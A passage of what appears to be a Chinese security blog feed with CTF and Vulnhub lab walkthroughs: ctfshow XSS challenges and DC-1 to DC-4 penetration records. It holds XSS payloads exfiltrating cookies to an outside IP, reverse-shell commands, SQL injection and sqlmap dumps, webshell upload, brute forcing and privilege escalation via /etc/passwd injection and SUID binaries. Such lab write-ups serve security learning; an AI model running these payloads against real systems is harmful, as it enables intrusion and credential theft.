class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;svg/onload=&quot;window.location.href=&#x27;http://ip/get.php?c=&#x27;+document.cookie;&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="Web321-Web326"><a href="#Web321-Web326" class="headerlink" title="Web321-Web326"></a>Web321-Web326</h2><p>同Web320</p><h2 id="Web327"><a href="#Web327" class="headerlink" title="Web327"></a>Web327</h2><p>存储型xss没有过滤</p><p>收件人写admin</p><p>信的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h2><p>用户管理界面可以看到用户 账号 密码</p><p>可以把密码改为JS代码(获取cookie)，管理员查看页面会触发xss代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>读取cookie.txt获取到管理员的cookie</p><p>抓包点击用户管理将cookie替换为刚刚获得的管理员cookie登录成功后发现flag</p><h2 id="Web329"><a href="#Web329" class="headerlink" title="Web329"></a>Web329</h2><p>失效凭证 cookie一直在变</p><p>可以不使用cookie利用js代码获取网页源代码读取带有ctfshow的字段标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">$(<span class="hljs-string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">index,value</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(value.<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;ctf&#x27;</span>+<span class="hljs-string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="hljs-number">1</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://43.138.124.233/get.php?c=&#x27;</span>+value.<span class="hljs-property">innerHTML</span>; </span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Web330"><a href="#Web330" class="headerlink" title="Web330"></a>Web330</h2><p>后台管理员有功能页面，能够查看注册用户的账号密码<br>其中有一个修改的密码，通过访问一个地址即可修改密码（抓包分析，需用户登录状态）<br>思路：注册一个用户名和密码存在跳转修改密码的URL地址连接<br>如果管理员登录了后台，然后查看了用户的注册密码信息，就可以尝试重置密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>管理员密码成功改为123 </p><h2 id="Web331"><a href="#Web331" class="headerlink" title="Web331"></a>Web331</h2><p>思路同上，修改密码的方式由GET改为了POST</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">p</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;&#125;);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Web332"><a href="#Web332" class="headerlink" title="Web332"></a>Web332</h2><p>发现flag需要9999</p><p>有一个转账功能</p><p>随便注册一个号然后转账负数</p><h2 id="Web333"><a href="#Web333" class="headerlink" title="Web333"></a>Web333</h2><p>利用xss让管理员给我们转账</p><p>抓包分析转账参数 u为用户名 a为转账金额 post提交</p><p>先注册一个123账号用来收钱</p><p>然后注册带xss语句的用户</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/amount.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">u</span>:<span class="hljs-string">&#x27;123&#x27;</span>,<span class="hljs-attr">a</span>:<span class="hljs-string">&#x27;10000&#x27;</span>&#125;&#125;);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>非预期解<br>自己给自己转账，指数增长，不能超过当前余额</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub DC-4靶机渗透记录</title>
    <link href="/posts/bacc01ec/"/>
    <url>/posts/bacc01ec/</url>
    
    <content type="html"><![CDATA[<h1 id="Vulnhub-DC-4打靶记录"><a href="#Vulnhub-DC-4打靶记录" class="headerlink" title="Vulnhub DC-4打靶记录"></a>Vulnhub DC-4打靶记录</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.168.0/24<br></code></pre></td></tr></table></figure><p>发现目标192.168.168.153扫下端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.168.153 -p 1-65535<br></code></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220707175229860.png" alt="image-20220707175229860"></p><p>只有一个80端口</p><p><img src="/posts/bacc01ec/image-20220707175340019.png" alt="image-20220707175340019"></p><p>一个管理员登录界面 看下能不能注入</p><p><img src="/posts/bacc01ec/image-20220707175904576.png" alt="image-20220707175904576"></p><p>看来不行</p><p>目录扫描也没有结果</p><p>试下爆破管理员密码</p><p>用burp爆破出来密码为happy</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>登录到后台</p><p>发现可以执行命令</p><p><img src="/posts/bacc01ec/image-20220707194145456.png" alt="image-20220707194145456"></p><p>抓包看下参数</p><p><img src="/posts/bacc01ec/image-20220707194257511.png" alt="image-20220707194257511"></p><p>把radio参数改为反弹shell命令空格用+代替</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc+-e+/bin/bash+192.168.168.129+4444<br></code></pre></td></tr></table></figure><p>记得kali要先监听4444端口</p><p><img src="/posts/bacc01ec/image-20220707195334495.png" alt="image-20220707195334495"></p><p>权限很低没有写权限只能读文件 看下敏感文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> etc/passwd<br></code></pre></td></tr></table></figure><p>看到三个用户charles，jim，sam</p><p><img src="/posts/bacc01ec/image-20220708224335646.png" alt="image-20220708224335646"></p><p>在jim的home目录下看到一个备份文件</p><p><img src="/posts/bacc01ec/image-20220708224610677.png" alt="image-20220708224610677"></p><p>应该是备份密码 把里面内容copy到pass.txt</p><p>该ip开放有22端口 可以ssh爆破用hydra 再新建一个user.txt 内容就是那三个用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -L user.txt -P pass.txt 192.168.168.153 ssh<br></code></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220708225906866.png" alt="image-20220708225906866"></p><p>成功爆破出jim的ssh密码</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用Xshell连接靶机ssh</p><p>翻一下文件 再home目录下发现一个测试邮件</p><p><code>var/mail</code>下发现一个邮件</p><p>发现charles的密码</p><p><img src="/posts/bacc01ec/image-20220709183018101.png" alt="image-20220709183018101"></p><p>换到charles用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">su charles<br>^xHhA&amp;hvim0y<br></code></pre></td></tr></table></figure><p>看下可以执行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br></code></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220709183558427.png" alt="image-20220709183558427"></p><p>可以执行teehee命令（teehee命令可以写入文件内容并不覆盖文件原有内容）</p><p>可以利用teehee进行提权，用teehee把一个无密码用户写入到&#x2F;etc&#x2F;passwd文件，并加入到root组中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;fatty::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd<br></code></pre></td></tr></table></figure><blockquote><p>&#x2F;etc&#x2F;passwd </p><p>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</p><p>用户名，就是一串代表用户身份的字符串。</p><p>UID:也就是用户 ID（<code>0</code>超级用户，<code>1~499</code>系统用户（伪用户）<code>500~65535</code> 普通用户）</p><p>GID:全称“Group ID”，简称“组ID”，表示用户初始组的组 ID 号</p></blockquote><p>切换到fatty用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">su fatty<br>id<br></code></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220709184644368.png" alt="image-20220709184644368"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /root/flag.txt<br></code></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220709184757317.png" alt="image-20220709184757317"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub DC-3靶机渗透记录</title>
    <link href="/posts/f0f28aa7/"/>
    <url>/posts/f0f28aa7/</url>
    
    <content type="html"><![CDATA[<h1 id="Vulnhub-DC-3打靶记录"><a href="#Vulnhub-DC-3打靶记录" class="headerlink" title="Vulnhub DC-3打靶记录"></a>Vulnhub DC-3打靶记录</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>扫描网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.168.0/24<br></code></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601224526760.png" alt="image-20220601224526760"></p><p>发现一个目标 扫描端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.168.146 -p 1-65535<br></code></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601224606759.png" alt="image-20220601224606759"></p><p>只有一个80端口</p><p>使用wappalyzer发现cms: Joomla</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>百度下joomla的历史漏洞，发现存在sql注入漏洞</p><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://your-ip:8080/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)<br></code></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601225344829.png" alt="image-20220601225344829"></p><p>确实存在sql注入漏洞可以利用</p><p>直接sqlmap开跑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u&quot;http://192.168.168.146/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=&quot; --dbs<br></code></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601230403567.png" alt="image-20220601230403567"></p><p>看看能不能拿到数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u&quot;http://192.168.168.146/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=&quot; -D joomladb -T &quot;#__users&quot; -C username,password --dump<br></code></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601231045796.png" alt="image-20220601231045796"></p><p>拿到admin用户密码的hash值</p><p><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p><p>利用john进行爆破</p><p>新建一个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim admin-hash<br></code></pre></td></tr></table></figure><p>把获取到的hash值填进去</p><p>john爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">john admin-hash <br></code></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220702225157861.png" alt="image-20220702225157861"></p><p>得到密码<code>snoopy</code></p><p>御剑扫描发现一个<a href="http://192.168.168.146/administrator/">http://192.168.168.146/administrator/</a></p><p>登录到后台</p><p>发现文件上传漏洞</p><p><img src="/posts/f0f28aa7/image-20220702225815839.png" alt="image-20220702225815839"></p><p><img src="/posts/f0f28aa7/image-20220705221027682.png" alt="image-20220705221027682"></p><p>进去新建一个shell.php</p><p>蚁剑连接url为:<a href="http://192.168.168.146/templates/beez3/shell.php">http://192.168.168.146/templates/beez3/shell.php</a></p><p><img src="/posts/f0f28aa7/image-20220705221131144.png" alt="image-20220705221131144"></p><p>为web权限</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用searchsploit查找Ubuntu 16.04可以利用的漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220705221540008.png" alt="image-20220705221540008"></p><p>存在内核提权</p><p>查看利用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /usr/share/exploitdb/exploits/linux/local/39772.txt<br></code></pre></td></tr></table></figure><p>发现下载地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip <br></code></pre></td></tr></table></figure><p>解压文件</p><p>利用蚁剑上传exp</p><p><img src="/posts/f0f28aa7/image-20220706102455223.png" alt="image-20220706102455223"></p><p>反弹shell</p><p>在刚才的shell.php中写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.168.129 4444 &gt;/tmp/f&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>监听4444端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp 4444<br></code></pre></td></tr></table></figure><p>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220706104510795.png" alt="image-20220706104510795"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub DC-2靶机渗透记录</title>
    <link href="/posts/27100aff/"/>
    <url>/posts/27100aff/</url>
    
    <content type="html"><![CDATA[<h1 id="Vulnhub-DC-2"><a href="#Vulnhub-DC-2" class="headerlink" title="Vulnhub DC-2"></a>Vulnhub DC-2</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描资产</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.168.0/24<br></code></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515092019810.png" alt="image-20220515092019810"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -A -sV -p- -T4 192.168.168.143<br></code></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515092955208.png" alt="image-20220515092955208"></p><p>发现80端口存在 <code>Did not follow redirect to http://dc-2/</code> 也就是dns服务器无法重定向到<a href="http://dc-2/">http://dc-2/</a> 所以直接使用ip地址访问是无法成功的</p><p>所以要更改host文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>windows下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Windows\System32\drivers\etc\hosts<br></code></pre></td></tr></table></figure><p>添加一个192.168.168.143 dc-2</p><p><img src="/posts/27100aff/image-20220515094005916.png" alt="image-20220515094005916"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>更改完成后即可访问在主界面即可找到flag1</p><p><img src="/posts/27100aff/image-20220515094515186.png" alt="image-20220515094515186"></p><p>大概意思就是使用cewl生成密码字典</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cewl http://dc-2/ -w pwd.txt <br></code></pre></td></tr></table></figure><p>在网站底部发现是wordpress建的</p><p>使用wpscan 枚举账户</p><p>api可以到<a href="https://wpvulndb.com/users/sign_up">https://wpvulndb.com/users/sign_up</a> 注册获取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wpscan --url http://dc-2/ --enumerate u --api-token xxxxxxxxxxx<br></code></pre></td></tr></table></figure><p>接下密码爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wpscan --url http://dc-2/ user.txt -P /root/桌面/pwd.txt --api-token xxxxx<br></code></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515101623014.png" alt="image-20220515101623014"></p><p>接下来进入后台</p><p>wordpress的后台地址为:&#x2F;wp-admin</p><p>使用jerry账户登录发现flag2</p><p><img src="/posts/27100aff/image-20220515103444441.png" alt="image-20220515103444441"></p><p>大概意思是让我们另一个突破口</p><p>利用前面找到的ssh</p><p>使用tom账号成功登录</p><p>目录下存在flag3.txt</p><p>但是很多查看命令都看不了使用vi查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi flag.txt<br></code></pre></td></tr></table></figure><p>意思是让我们换成jerry用户</p><p>但tom使用rbash权限非常小 要想办法绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">BASH_CMDS[a]=/bin/sh;a # 把bin/sh给变量a<br>export PATH=$PATH:/bin/ # 将/bin 作为PATH环境变量导出<br></code></pre></td></tr></table></figure><p>其他绕过方法：<a href="https://www.freebuf.com/articles/system/188989.html">Linux Restricted Shell绕过技巧总结 - FreeBuf网络安全行业门户</a></p><p>切换到Jerry</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">su jerry<br>cd /home/jerry<br>ls<br>cat flag4.txt<br></code></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515105352487.png" alt="image-20220515105352487"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>老样子还是uid提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515111029686.png" alt="image-20220515111029686"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br></code></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515111228910.png" alt="image-20220515111228910"></p><p>发现git为root权限执行</p><p>注意执行命令前先把终端变窄不然会报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo git help ifconfig<br></code></pre></td></tr></table></figure><p>在末尾输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">!/bin/bash<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /root<br>ls<br>cat cat final-flag.txt<br></code></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515112312605.png" alt="image-20220515112312605"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub DC-1靶机渗透记录</title>
    <link href="/posts/84468c56/"/>
    <url>/posts/84468c56/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-DC-1"><a href="#vulnhub-DC-1" class="headerlink" title="vulnhub DC-1"></a>vulnhub DC-1</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.168.0/24<br></code></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212318465.png" alt="image-20220513212318465"></p><p>发现目标</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>目标开放80端口，访问</p><p>网站底部发现cms信息</p><p><img src="/posts/84468c56/image-20220513211257084.png" alt="image-20220513211257084"></p><p>利用msf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">search drupal<br>use exploit/multi/http/drupal_drupageddon<br>show options<br>setRHOST 192.168.168.142<br>exploit<br></code></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212247156.png" alt="image-20220513212247156"></p><p>成功拿到会话</p><p>看下目录下都有什么</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls<br></code></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212514963.png" alt="image-20220513212514963"></p><p>看一下flag1.txt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat flag1.txt<br></code></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212550669.png" alt="image-20220513212550669"></p><p>意思是每个cms都有一个配置文件让我们找到他</p><p>翻了半天在&#x2F;var&#x2F;www&#x2F;sites&#x2F;default下找到了一个settings.php</p><p>打开发现了数据库账号密码以及flag2</p><p><img src="/posts/84468c56/image-20220513213324393.png" alt="image-20220513213324393"></p><p><img src="/posts/84468c56/image-20220513213439596.png" alt="image-20220513213439596"></p><p><img src="/posts/84468c56/image-20220513213513210.png" alt="image-20220513213513210"></p><p>进入到shell连接mysql</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">shell<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; #完整的shell环境<br>mysql -udbuser -pR0ck3t<br>show databases;<br>use drupaldb;<br>show tables;<br>select * from users;<br></code></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513220411683.png" alt="image-20220513220411683"></p><p>pass进行了加密</p><p>百度发现drupalCMS使用的是 &#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh对密码进行加密的</p><p>同时我们也可以利用这个文件 自行机密一个密码然后替换掉原来的密码</p><p>到scripts进行调用发现不能用 到www目录下可以调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">scripts/password-hash.sh 123456<br></code></pre></td></tr></table></figure><p>得到新密码的加密值</p><p><img src="/posts/84468c56/image-20220513221916364.png" alt="image-20220513221916364"></p><p>到mysql中把admin密码改成新密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mysql -udbuser -pR0ck3t<br>use drupaldb;<br>update users set pass=&#x27;$S$DaAOPXcKfpHXmrZY07Ro0GS9X7JpEnIyQxOpJK3pHnnB3Ii/FR.T&#x27; where name=&#x27;admin&#x27;;<br></code></pre></td></tr></table></figure><p>进入到后台登录</p><p><img src="/posts/84468c56/image-20220513223201939.png" alt="image-20220513223201939"></p><p><img src="/posts/84468c56/image-20220513223215081.png" alt="image-20220513223215081"></p><p>发现flag3</p><p><img src="/posts/84468c56/image-20220513223236120.png" alt="image-20220513223236120"></p><p>在shell中全局搜索flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name &#x27;flag*&#x27;<br></code></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513223705776.png" alt="image-20220513223705776"></p><p>接下来就该提权了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>利用msf上传探针脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">upload /root/桌面/LinEnum/LinEnum.sh /tmp/<br></code></pre></td></tr></table></figure><p>进入shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp/<br>chmod +x LinEnum.sh<br>./LinEnum.sh<br></code></pre></td></tr></table></figure><p>利用suid提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -user root -perm -4000 -print 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513225105361.png" alt="image-20220513225105361"></p><p>find可以用来提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">touch shell<br>find shell -exec whoami 